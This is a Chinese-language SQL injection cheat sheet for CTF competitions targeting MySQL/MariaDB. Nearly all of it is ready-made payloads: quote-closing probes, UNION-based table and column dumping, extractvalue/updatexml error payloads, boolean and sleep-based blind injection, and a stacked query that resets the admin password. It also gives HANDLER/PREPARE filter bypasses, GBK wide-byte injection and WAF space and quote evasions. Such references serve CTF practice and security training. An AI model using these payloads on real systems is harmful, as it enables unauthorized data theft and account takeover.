💉 SQL Injection (SQLi) - Complete Field Manual
===============================================

> Tags: #CTF #Web #SQLi #Database #MySQL
> 
> Date: 2025-11-21
> 
> Target: MySQL/MariaDB (CTF Mainstream)
> 
> Summary: 从探测、联合查询到高阶盲注与提权的完整速查表。

* * *

🚦 Phase 0: Detection & Comments (探测与闭合)
----------------------------------------

**目标**：判断是否存在注入点，以及闭合方式。

### 常见闭合字符

尝试在参数后添加以下字符，观察页面报错或异常：

* `'` (单引号 - 最常见)

* `"` (双引号)

* `)`

* `')`

* `")`

* `\` (反斜杠 - 也就是转义符，用于查看报错中吃掉的引号)

### 注释符 (用于截断后面的语句)

* `--+` (URL中空格需转义为 `+` 或 `%20`，最常用)

* `#` (URL编码为 `%23`)

* `/*` (多行注释，用于行内绕过)

* * *

🥇 Phase 1: Union Based (联合注入)
------------------------------

> **条件**：页面有回显位 (直接显示数据库查出的内容)。

### Step 1: Determine Column Count (猜字段数)

利用 `ORDER BY` 二分法查找列数，直到页面报错。

```
SQL
    ' ORDER BY 1 --+  (正常)' ORDER BY 10 --+ (报错)
    ' ORDER BY 5 --+  (确定列数)
```

### Step 2: Find Display Position (找回显点)

使用 `UNION SELECT`，将数字改为负数或极大值，强迫前面的查询失效，从而显示后面的数字。

```
SQL
    -1' UNION SELECT 1,2,3 --+
```

_(假设页面显示了 2，说明第 2 列是回显位)_

### Step 3: Data Extraction (爆数据)

在回显位（假设是 2）填入 Payload：

**A. 查库名 & 版本**

```
SQL
    database()
    version()
    user()
    @@datadir
```

**B. 查表名 (Tables)**

```
SQL
    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())
```

**C. 查列名 (Columns)**

```
SQL
    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag')
```

_(注：如果 table_name 被过滤，可用 hex 编码代替，如 'flag' -> 0x666c6167)_

**D. 查数据 (Dump Data)**

```
SQL
    (SELECT group_concat(flag) FROM flag)
```

1. ```
   先找位置:
   UNION SELECT 1, [这里是显示区] , 3
   ```

2. ```
   查表名
   UNION SELECT 1, [ SELECT group_concat(table_name) ... ] , 3
   ```
   
   ⬇️ 结果
    "users, flag_table"

3. ```
   查列名:
   UNION SELECT 1, [ SELECT group_concat(column_name) ... ] , 3
   ```
   
    ⬇️ 结果
    "id, content"

4. ```
   查数据:
   UNION SELECT 1, [ SELECT group_concat(content) ... ] , 3
   ```
   
   ⬇️ 结果
   "ctf{...}"
   
   

* * *

🥈 Phase 2: Error Based (报错注入)
------------------------------

> **条件**：没有回显位，但页面会打印 SQL 报错信息。

### 核心函数: `extractvalue` & `updatexml` (最常用)

利用 XML 解析错误将查询结果带出来。**注意：最大长度限制 32 位**，长数据需用 `substr` 切割。

**Payload 1: ExtractValue**

```
SQL
    ' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e))) --+
```

**Payload 2: UpdateXML**

```
SQL
    ' AND (updatexml(1,concat(0x7e,(SELECT substring(flag,1,30) FROM flag),0x7e),1)) --+
```

* * *

🥉 Phase 3: Blind Injection (盲注)
--------------------------------

> 条件：无回显，无报错。页面只有“True/False”两种状态，或者响应时间不同。
> 
> 策略：脚本梭哈。手注是不可能的。

### 1. Boolean Blind (布尔盲注)

通过页面返回的长度/内容差异判断。

逻辑：ascii(substr(数据, 位置, 1)) > 数字

**Payload 核心:**

```
SQL
    ' AND ascii(substr((SELECT database()),1,1))>100 --+
```

* 如果库名第一个字母 ASCII > 100，页面显示“正常/存在”。

* 否则，页面显示“404/不存在”。

### 2. Time Based (时间盲注)

通过页面响应时间判断。

核心函数：sleep(5), benchmark()

**Payload 核心:**

```
SQL
    ' AND if(ascii(substr(database(),1,1))>100, sleep(5), 0) --+
```

* 如果判断为真，网页转圈 5 秒。

* * *

💀 Phase 4: Advanced Techniques (高阶技巧)
--------------------------------------

### 1. Stacked Queries (堆叠注入)

> 条件：后端使用 mysqli_multi_query 或 PDO。允许执行多条 SQL 语句，用分号 ; 隔开。
> 
> 威力：可以直接 UPDATE, DELETE, INSERT，甚至写 Shell。

**Payload (强行改密码/写Shell):**

```
SQL
    '; UPDATE users SET password='123' WHERE user='admin'; --+'; PREPARE stmt FROM 'SELECT * FROM flag'; EXECUTE stmt; --+ (利用预编译绕过select过滤)
```

Handler 技巧 (MariaDB/MySQL):

当 SELECT 被完全禁用时：

```
SQL
    '; HANDLER flag_table OPEN; HANDLER flag_table READ FIRST; --+
```

### 2. Wide Byte Injection (宽字节注入)

> 条件：数据库编码为 GBK，且使用了 addslashes 或 magic_quotes_gpc 转义引号（将 ' 变为 \'）。
> 
> 原理：%df + \ ( %5c ) = 汉字 (運)。吃掉转义符。

**Payload:**

```
HTTP
    id=-1%df%27 UNION SELECT 1,2,3 --+
```

### 3. Quoted-Printable / Hex Encoding (绕过引号)

当 WAF 过滤了单引号 `'` 时，将字符串转为 Hex。

* `WHERE name='admin'` $\rightarrow$ `WHERE name=0x61646d696e`

### 4. Space Bypass (绕过空格)

* `/**/` (内联注释)

* `%0a` (换行符 - 强力)

* `%09` (Tab)

* `()` (括号包裹) -> `SELECT(flag)FROM(table)`
